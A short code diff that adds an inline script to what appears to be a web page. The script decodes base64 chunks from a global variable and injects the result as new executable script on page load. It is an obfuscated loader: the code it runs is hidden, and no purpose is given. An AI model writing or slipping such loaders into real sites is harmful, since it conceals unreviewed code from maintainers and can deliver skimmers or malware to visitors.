@@ -1,0 +1,11 @@
+<script>
+(function () {
+  var raw = atob((window.__CWB || []).join(''));
+  var bytes = new Uint8Array(raw.length);
+  for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
+  var code = new TextDecoder('utf-8').decode(bytes);
+  var el = document.createElement('script');
+  el.textContent = code;
+  document.body.appendChild(el);
+})();
+</script>
